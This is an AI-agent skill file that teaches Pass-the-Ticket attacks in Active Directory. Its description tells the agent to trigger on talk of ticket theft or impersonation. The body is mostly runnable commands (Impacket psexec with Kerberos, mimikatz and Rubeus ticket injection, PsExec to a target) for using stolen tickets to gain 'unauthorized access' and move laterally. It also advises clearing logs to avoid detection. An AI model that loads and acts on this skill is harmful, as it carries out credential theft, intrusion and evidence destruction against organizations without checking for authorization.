---
name: pass-the-ticket
description: How to execute Pass the Ticket (PTT) attacks in Active Directory environments. Use this skill whenever the user mentions Kerberos tickets, authentication bypass, ticket theft, PTT attacks, or needs to impersonate users using stolen tickets. Also trigger for ticket format conversion between Linux (ccache) and Windows (kirbi) formats, or when working with mimikatz, Rubeus, or Kekeo for ticket manipulation.
---

# Pass the Ticket (PTT) Attack Methodology

## Overview

Pass the Ticket (PTT) is an attack technique where you **steal a user's authentication ticket** instead of their password or hash. The stolen ticket is then used to **impersonate the user** and gain unauthorized access to resources within a network.

**Why use PTT?**
- No password or hash required
- Works even with strong password policies
- Bypasses password-based authentication entirely
- Effective against Kerberos-based authentication

## Prerequisites

Before executing PTT, you need to obtain a valid Kerberos ticket. See:
- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Ticket Format Conversion

Tickets exist in different formats depending on the platform. You'll often need to convert between them.

### Linux to Windows (ccache → kirbi)

Use the [ticket_converter](https://github.com/Zer1t0/ticket_converter) tool:

```bash
python ticket_converter.py input.ccache output.kirbi
```

This converts Linux ccache format to Windows kirbi format.

### Windows to Linux (kirbi → ccache)

```bash
python ticket_converter.py input.kirbi output.ccache
```

### On Windows

Use [Kekeo](https://github.com/gentilkiwi/kekeo) for ticket manipulation and conversion.

## Executing PTT Attacks

### On Linux

1. **Export the ticket path**
   ```bash
   export KRB5CCNAME=/path/to/your/ticket.krb5cc
   ```

2. **Execute with Impacket**
   ```bash
   python psexec.py DOMAIN/username@TARGET_HOST -k -no-pass
   ```
   - `-k`: Use Kerberos authentication
   - `-no-pass`: No password required (using ticket)

### On Windows

1. **Load the ticket into memory**

   Using Mimikatz:
   ```powershell
   mimikatz.exe "kerberos::ptt [ticket.kirbi]"
   ```

   Using Rubeus:
   ```powershell
   .\Rubeus.exe ptt /ticket:[ticket.kirbi]
   ```

2. **Verify the ticket is loaded**
   ```powershell
   klist
   ```
   This shows all tickets currently in the cache.

3. **Execute commands on target**
   ```powershell
   .\PsExec.exe -accepteula \\TARGET_HOST cmd
   ```

## Common Scenarios

### Scenario 1: You have a TGT (Ticket Granting Ticket)

If you have a TGT for a user, you can:
- Access any resource the user can access
- Request service tickets (TGS) for specific services
- Move laterally across the domain

### Scenario 2: You have a TGS (Service Ticket)

If you have a TGS for a specific service:
- You can only access that specific service
- Useful for targeted attacks (e.g., SQL Server, CIFS)

### Scenario 3: Cross-platform attacks

If you're attacking from Linux but the target is Windows (or vice versa):
1. Convert the ticket to the appropriate format
2. Load it on your attack platform
3. Execute the attack

## Tools Reference

| Tool | Platform | Purpose |
|------|----------|----------|
| ticket_converter | Cross-platform | Convert between ccache and kirbi formats |
| Kekeo | Windows | Ticket manipulation and conversion |
| Mimikatz | Windows | Load tickets, PTT attacks |
| Rubeus | Windows | Modern alternative to Mimikatz for Kerberos |
| Impacket (psexec.py) | Linux | Execute commands using Kerberos tickets |
| klist | Windows | View cached tickets |

## Important Notes

- **Tickets expire**: Kerberos tickets have limited lifetimes. Use them quickly.
- **Ticket integrity**: Ensure tickets aren't corrupted during transfer/conversion.
- **Detection**: PTT attacks can be detected. Clear logs and use carefully.
- **Privilege escalation**: A TGT for a high-privilege user (e.g., Domain Admin) gives you that user's full access.

## References

- [How to Attack Kerberos - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz)
- [Rubeus - PowerSploit](https://github.com/GhostPack/Rubeus)
- [Impacket - Psexec](https://github.com/fortra/impacket)
